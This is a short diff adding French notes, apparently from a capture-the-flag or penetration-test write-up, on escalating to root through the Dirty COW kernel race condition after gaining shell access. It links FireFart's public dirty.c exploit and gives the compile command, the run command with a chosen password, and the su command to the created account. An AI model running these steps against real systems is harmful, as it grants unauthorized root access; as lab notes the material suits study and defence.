@@ -1,0 +1,9 @@
+
+
+Bon dès que l'on a un accès au shell on peut se débrouiller pour exploiter iune faille du kernel avec une "race condition".
+On va utiliser un script déjà tout fait avec Firefart !
+Source: https://github.com/FireFart/dirtycow/blob/master/dirty.c
+gcc -pthread dirty.c -o dirty -lcrypt
+./dirty oui
+
+su firefart
